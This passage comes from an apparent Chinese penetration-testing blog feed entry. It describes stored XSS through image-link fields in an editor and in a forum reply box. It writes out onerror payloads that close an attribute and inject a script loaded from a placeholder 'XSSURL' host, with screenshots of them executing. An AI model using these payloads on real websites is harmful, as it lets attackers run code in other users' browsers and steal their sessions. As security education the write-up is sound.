onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&quot;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p><p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p><p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p><h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p><p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p>这里直接把payload放进去，看下前端显示</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p><p>同样的思路，这里直接闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror&#x3D;&quot;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p><p>成功加载payload</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p><p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
</feed>
